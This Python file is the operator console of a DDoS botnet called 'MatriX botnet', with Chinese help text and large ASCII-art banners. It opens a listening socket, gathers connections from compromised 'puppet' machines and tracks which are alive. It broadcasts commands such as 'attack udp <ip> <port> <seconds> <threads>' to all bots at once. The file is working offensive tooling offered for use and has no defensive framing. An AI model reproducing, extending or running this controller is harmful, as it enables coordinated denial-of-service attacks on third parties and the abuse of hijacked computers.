from threading import Thread
from time import sleep
import ctypes, socket, sys
import platform, signal
from random import choice
from typing import Union, Tuple
from colorama import Fore
import os

if os.name == "nt":
    os.system("@cls & @title MatriX botnet & @color a")
else:
    os.system("clear")
print(f'''
{Fore.MAGENTA}
      `                                                                                       `     
      s.                                                                                     s.     
    y.:m:                                                                                  .hs y.   
   .Nd`oNs`                                                                               /md`oMo   
   -MMy`oMd:                                                                            .yMd.+MMs   
    dMMd./NMy.                                                                        `oNMs.sMMN-   
  ++.yMMN+-yMNy-                                                                    .+mMm:-dMMd::s  
  +Mm+/hMMd/:dMNh/.                                                              `:sNMm+-sNMm+:yNd  
  `hMMmsohNMd//hMMNh+.                                                        `/ymMMd+/yNMdsodNMN:  
   `+dMMNmmMMMmsoymMMNy-              -                      `.             .omMMNhoodNMMmmNMMNs.   
  `.``:ohmMMMMMMNmyshNMNs`            d+`                   :d-            /mMMdysdNMMMMMMNdy/.``.  
  `odhs+/++shmNMMMMNhoyNMh`           +Md+.              `:yNh`           +NMdoymMMMMMmhyo+/+oydy-  
    -sdNNNNNNNMMMMMMMNh+dMs           :ymMNh++syyyyyyyo+ymMNh+`          :MNosNMMMMMMMNNNNNNNmy/`   
   --..-/+oyhNMMMMMMMMMN+hM-.:.       `ohyhdmmddmMMNdhmNdhyhh-       `-:`dN/dMMMMMMMMMMdys+/:-..-`  
   :hmmmmNNMMNmmMMMMMMMMN/Nh`/hdysoooy//Mm:o::yNmhhdNd+-o+sMh.ysoooshho`+MohMMMMMMMMNdmMMNNmmmmd+`  
    `-/oss+/:+hNMMNdMMMMMh+Ns`-+yhdddh/sMshm.O`:NMMMo`O sM/MN.hdddhyo/`:Ny+MMMMMmmMMMdo//+oso+:.    
         `:odMMMmsoNMMMMMh`oNo./syhdddh-mNydo/+-/MMy-/++hydN++ddddhy+-:Nh./MMMMMMy+hNMMmy/.         
      ./ydNNmds:-sNMMNMMm.+o+Ny`-/ooooo.+ydhhhhhyssshhhhhdho.+oooo+:`/Ny/y`yMMMNMMh:-+hmNNmh+-      
      `-:::-.`.omMMmodMN:/NMy/dd:./syhho:mmmmmmMMs-MMNmmmmms-hhyy+-.smo+NMy.dMN+dMMNy:``--::-.      
           `:yNMNms-oMm/oNMNs-/oho-ohyo/-/yyhdNMN++hMMdhyyo-:oyhy:/hs/:/dMMh:hMd-+dNMNh+.           
          .+sso+-`.smy+dNmy+yNNy./o//ymNNmho+sddsNMshmy++ydNMNd+:o+.+mNh+odNmoodd-`./osyo-          
                 -oooydysyhdhs++sdh+. .:oydmNdo:sNNd:+hNNdys/-``:sdh+/oyddyyyhho+o:                 
                   ..-:/+ooosyddyo+shyy:/ys//smmy++smmh+/oyo-yyhyo+shdhyoooo+:-..`                  
                        `....``.:osssso/ .yNdosshNNdssoyNd: -osssso/-``.....`                       
                                           :hNmMmyyhMNNm+`                                          
                                        `.`  /dMMMMMMmo` `..`                                       
                                    `.+s/-+`  `/dMMNo. ` :::so-`                                    
                                   :dms-+h.`+ `../o-`- /- sy-/dmo                                   
                                   /s.:mm..d: s.h+-m.y.`d/`yNo`+y                                   
                                      yN-:Nh +m`NMNM/od`/Mo`hm`                                     
                                      .:.NM-:Mh.MMMMo/Ms`dM+`:                                      
                                         +y`dMs/MMMMh-MN-:h`                                        
                                          ` `y//MMMMy`d:  `                                         
                                              ` :mMo  `                                             
{Fore.RED}                                       `-                                                 
              ▄▄▄▄███▄▄▄▄      ▄████████     ███        ▄████████  ▄█  ▀████    ▐████▀ 
            ▄██▀▀▀███▀▀▀██▄   ███    ███ ▀█████████▄   ███    ███ ███    ███▌   ████▀  
            ███   ███   ███   ███    ███    ▀███▀▀██   ███    ███ ███▌    ███  ▐███    
            ███   ███   ███   ███    ███     ███   ▀  ▄███▄▄▄▄██▀ ███▌    ▀███▄███▀    
            ███   ███   ███ ▀███████████     ███     ▀▀███▀▀▀▀▀   ███▌    ████▀██▄     
            ███   ███   ███   ███    ███     ███     ▀███████████ ███    ▐███  ▀███    
            ███   ███   ███   ███    ███     ███       ███    ███ ███   ▄███     ███▄  
             ▀█   ███   █▀    ███    █▀     ▄████▀     ███    ███ █▀   ████       ███▄ 
                                                       ███    ███                                                                       `-                                                 
''')

 
class Colours:
	def __init__(self): 
		if platform.system() == 'Windows':
			kernel32 = ctypes.windll.kernel32
			kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
		COMMANDS = {
			# Lables
			'info': (33, '[!] '),
			'que': (34, '[?] '),
			'bad': (31, '[-] '),
			'good': (32, '[+] '),
			'run': (97, '[~] '),
			# Colors
			'green': 32,
			'lgreen': 92,
			'lightgreen': 92,
			'grey': 37,
			'black': 30,
			'red': 31,
			'lred': 91,
			'lightred': 91,
			'cyan': 36,
			'lcyan': 96,
			'lightcyan': 96,
			'blue': 34,
			'lblue': 94,
			'lightblue': 94,
			'purple': 35,
			'yellow': 93,
			'white': 97,
			'lpurple': 95,
			'lightpurple': 95,
			'orange': 33,
			# Styles
			'bg': ';7',
			'bold': ';1',
			'italic': '3',
			'under': '4',
			'strike': '09',
		}
		for key, val in COMMANDS.items():
			value = val[0] if isinstance(val, tuple) else val
			prefix = val[1] if isinstance(val, tuple) else ''
			locals()[key] = lambda s, prefix=prefix, key=value: _gen(s, prefix, key)
			self.__dict__[key] = lambda s, prefix=prefix, key=value: self._gen(s, prefix, key)

	def _gen(self,string, prefix, key):
		colored = prefix if prefix else string
		not_colored = string if prefix else ''
		result = '\033[{}m{}\033[0m{}'.format(key, colored, not_colored)
		return result



class Server(Colours):
	co=["green","lgreen","lightgreen","grey","red","lred","lightred","cyan","lcyan","lightcyan","blue","lblue","lightblue","purple","yellow","white","lpurple","lightpurple","orange"]
	
	def __init__(self, connect:Tuple[str,int]=("0.0.0.0",9999)):#连接地址,此处无需设置,意思是在本地开放一个9999端口监听
		super().__init__()
		signal.signal(signal.SIGINT, self.exit_gracefully)
		signal.signal(signal.SIGTERM, self.exit_gracefully)
		self.all_connections = []
		self.all_address = []
		self.stop = False
		if self._bind(connect):
			while True:
				self._take_cmd()

	def exit_gracefully(self,signum:Union[str,object]="", frame:Union[str,object]=""):
		print(f"{Fore.RED}[!] {Fore.MAGENTA}退出控制端...")
		self.stop = True
		self.sock.close()
		sleep(3)
		sys.exit(0)

	def _bind(self, connect:Tuple[str,int]) -> bool:
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.sock.bind(connect)
		self.sock.listen(50)
		self.sock.settimeout(0.5)
	
		Thread(target=self.collect).start()
		Thread(target=self.check).start()

		return True

	
	def _print_help(self):
		help = ("attack udp <ip> <端口> <攻击时间/s> <线程>\nOptions:\n"
				"\tping			检查傀儡机是否存活\n"
				"\tkill			停止所有连接\n"
				"\tlist			查看所有连接\n"
				"\tupdate			更新连接列表\n"
				"\texit or quit 	        退出控制端\n")
		print(f"{Fore.GREEN}"+help)
	def collect(self):
		while not self.stop:
			try:
				conn, address = self.sock.accept()
				self.all_connections.append(conn)
				self.all_address.append(address)
			except socket.timeout:
				continue
			except socket.error:
				continue
			except Exception as e:
				print(f"{Fore.RED}[!] {Fore.MAGENTA}连接出错!")

	def _take_cmd(self):
		cmd=input(f"{Fore.RED}-->>").strip()
		if cmd:
			if cmd == "list":
				results = ''
				for i, (ip, port) in enumerate(self.all_address):
					results = results+self.__dict__[choice(self.co)](f'{[i]}    {ip}:{port}    连接\n')
				print(f"{Fore.YELLOW}----Clients----" + "\n" + results)
			elif cmd == "help":
				self._print_help()
			elif cmd == "update":
				self.check(display=True,always=False)
			elif cmd in ["exit","quit"]:
				self.exit_gracefully()
			elif "attack" in cmd:
				for i, (ip, port) in enumerate(self.all_address):
					try:
						self.all_connections[i].send(cmd.encode())
						print(self.__dict__[choice(self.co)](f'[+]    {ip}:{port}    {self.all_connections[i].recv(1024*5).decode("ascii")}'))
					except BrokenPipeError:
						del self.all_address[i]
						del self.all_connections[i]
			elif cmd == "ping" or "kill":
				for i, (ip, port) in enumerate(self.all_address):
					try:
						self.all_connections[i].send(cmd.encode())
						print(self.__dict__[choice(self.co)](f'[+]    {ip}:{port}    {self.all_connections[i].recv(1024*5).decode("ascii")}'))
					except BrokenPipeError:
						del self.all_address[i]
						del self.all_connections[i]


	def check(self, display:bool=False, always:bool=True):
		while not self.stop:
			c=0
			for n,tcp in zip(self.all_address,self.all_connections):
				c+=1
				try:
					tcp.send(str.encode("ping"))
					if tcp.recv(1024).decode("utf-8") and display:
							print(self.__dict__[choice(self.co)](f'[+]    {str(n[0])+":"+str(n[1])}    存活'))
				except:
					if display:
						print(self.__dict__[choice(self.co)](f'[+]    {str(n[0])+":"+str(n[1])}    未存活'))
					del self.all_address[c-1]
					del self.all_connections[c-1]
					continue
			if not always:
				break
			
			sleep(0.5)

if __name__ == '__main__':
	Server()
